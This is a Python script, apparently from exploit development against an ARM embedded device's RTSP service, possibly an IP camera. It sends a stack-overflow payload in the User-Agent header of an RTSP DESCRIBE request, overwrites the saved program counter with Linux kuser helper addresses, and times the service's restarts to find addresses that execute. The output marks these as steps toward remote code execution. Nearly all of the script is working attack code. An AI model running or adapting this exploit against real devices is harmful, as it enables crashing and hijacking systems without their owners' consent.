#!/usr/bin/env python3
"""
kuser_test.py — ARM kuser helper page oracle test.
Tests 0xFFFF0FE0/0xFFFF0FC0/0xFFFF0FA0/0xFFFF0F60 with 120-second poll.

ARM kuser helpers are mapped by the Linux kernel into EVERY process's
user-mode address space at 0xFFFF0000-0xFFFF0FFF.  Despite the high
virtual address, the PTE is marked USER+EXEC, so user-mode code can call
them without a privilege switch.  A 15s poll misses the ~74s full-reboot
signature; this script uses 120s to cleanly separate the three cases:

  < 5s  → FAST: SIGSEGV  (kuser ran & returned to garbage LR, OR address not mapped)
  5–70s → HIT:  code executed until watchdog killed process   ← RCE candidate!
 70–90s → SLOW: kernel panic / full reboot
  >120s → NO-RESTART: device stuck / loop lasting > watchdog period (unlikely)

Layout of the kuser page (standard ARM Linux):
  0xFFFF0FFC  kuser_helper_version  (4-byte version word)
  0xFFFF0FE0  kuser_get_tls         mrc p15 → R0; mov pc,lr   (returns fast)
  0xFFFF0FC0  kuser_cmpxchg         ldrex/strex retry loop;  may loop if R2 valid
  0xFFFF0FA0  kuser_memory_barrier  dsb; mov pc,lr            (returns fast)
  0xFFFF0F60  kuser_cmpxchg64       ldrd/strd retry loop;     longer potential loop
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248      # bytes from overflow start to saved-PC on stack

ADDRS_TO_TEST = [
    (0xFFFF0FE0, "kuser_get_tls      — mrc p15 → R0; mov pc,lr"),
    (0xFFFF0FC0, "kuser_cmpxchg      — ldrex/strex retry loop"),
    (0xFFFF0FA0, "kuser_memory_barrier — dsb; mov pc,lr"),
    (0xFFFF0F60, "kuser_cmpxchg64    — ldrd/strd retry loop"),
]

ORACLE_POLL   = 120   # seconds — must exceed ~74s kernel-panic reboot
RECOVERY_WAIT = 40    # seconds between tests to let device fully recover

# ── helpers ────────────────────────────────────────────────────────────────────

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() +
                  b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False


def wait_alive(max_wait=140, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            print(f"  [✓] RTSP alive{' — ' + label if label else ''} "
                  f"(waited {time.time()-t0:.0f}s)")
            return True
        time.sleep(2)
    print(f"  [!] RTSP still dead after {max_wait}s")
    return False


def send_overflow(pc_addr):
    """Send DESCRIBE with overflow payload, PC = pc_addr."""
    pad     = b'\xcc' * PC_OFFSET          # 0xCC = ARM undefined instr if exec'd
    payload = pad + struct.pack('<I', pc_addr) + b'\xcc' * 8
    req = (b"DESCRIBE rtsp://" + TARGET.encode() +
           b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + payload + b"\r\n\r\n")
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except Exception as e:
        pass  # crash expected — socket will close abruptly


def oracle(pc_addr, label, poll_timeout=ORACLE_POLL):
    """Return elapsed seconds until RTSP comes back, or poll_timeout if not."""
    addr_str = f"0x{pc_addr:08X}"
    print(f"\n{'='*60}")
    print(f"  Testing {addr_str}  ({label.strip()})")
    print(f"  Oracle timeout: {poll_timeout}s")
    print(f"{'='*60}")

    if not wait_alive(max_wait=140, label="pre-test check"):
        print("  [!] Device not responding — SKIP")
        return None

    print(f"  [→] Sending overflow with PC={addr_str} …", flush=True)
    t0 = time.time()
    send_overflow(pc_addr)
    print(f"  [~] Payload sent at T+{time.time()-t0:.2f}s — polling for restart …",
          flush=True)

    PROBE = (b"OPTIONS rtsp://" + TARGET.encode() +
             b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n")
    deadline = t0 + poll_timeout

    last_dot = t0
    while time.time() < deadline:
        time.sleep(0.5)
        # progress indicator every 5s
        if time.time() - last_dot >= 5:
            elapsed = time.time() - t0
            print(f"  … T+{elapsed:.0f}s (waiting for restart)", flush=True)
            last_dot = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                elapsed = time.time() - t0
                print(f"\n  [★] Restart detected at T+{elapsed:.1f}s")
                return elapsed
        except:
            pass

    elapsed = time.time() - t0
    print(f"\n  [?] No restart detected within {poll_timeout}s (T+{elapsed:.0f}s)")
    return poll_timeout   # sentinel: exceeded oracle window


def classify(t, addr):
    a = f"0x{addr:08X}"
    if t is None:
        return f"{a}  SKIP — device was unresponsive"
    if t < 5:
        return (f"{a}  FAST  {t:.1f}s  → SIGSEGV  "
                f"(NX or returned to bad LR — not directly useful)")
    if t < 70:
        return (f"{a}  *** HIT ***  {t:.1f}s  "
                f"→ CODE RAN until watchdog  ← RCE candidate!")
    if t < 90:
        return (f"{a}  SLOW  {t:.1f}s  "
                f"→ kernel panic / full reboot  (treated as kernel-space)")
    return (f"{a}  TIMEOUT {t:.0f}s  "
            f"→ loop alive past oracle window or very slow reboot")


# ── main ───────────────────────────────────────────────────────────────────────

print("\n" + "="*60)
print("ARM KUSER HELPER PAGE ORACLE TEST")
print(f"  Target : {TARGET}:{RTSP_PORT}")
print(f"  Oracle : {ORACLE_POLL}s poll per address")
print(f"  Recovery: {RECOVERY_WAIT}s sleep between tests")
print("="*60)

results = []

for i, (addr, label) in enumerate(ADDRS_TO_TEST):
    t = oracle(addr, label)
    results.append((addr, t))

    if i < len(ADDRS_TO_TEST) - 1:
        print(f"\n[*] Sleeping {RECOVERY_WAIT}s for device recovery …", flush=True)
        time.sleep(RECOVERY_WAIT)
        # Extra wait if device rebooted (slow restart after kernel panic)
        wait_alive(max_wait=100, label="post-recovery")

# ── summary ────────────────────────────────────────────────────────────────────

print("\n\n" + "="*60)
print("FINAL RESULTS")
print("="*60)
for (addr, t), (_, label) in zip(results, ADDRS_TO_TEST):
    print(f"  {classify(t, addr)}")
    print(f"     {label.strip()}")
print("="*60)

hits = [(addr, t) for addr, t in results if t is not None and 5 <= t < 70]
if hits:
    print("\n[!!!] EXECUTABLE ADDRESS(ES) FOUND:")
    for addr, t in hits:
        print(f"  0x{addr:08X}  restart={t:.1f}s — proceed to RCE chain")
else:
    print("\n[—] No HIT addresses found in this scan.")
    print("    Interpretation:")
    print("    • FAST (<5s)  → kuser code ran but returned immediately via bad LR")
    print("    • SLOW (~74s) → kernel treats 0xFFFF... as kernel-space on this device")
    print("    • TIMEOUT     → infinite loop without watchdog kill")
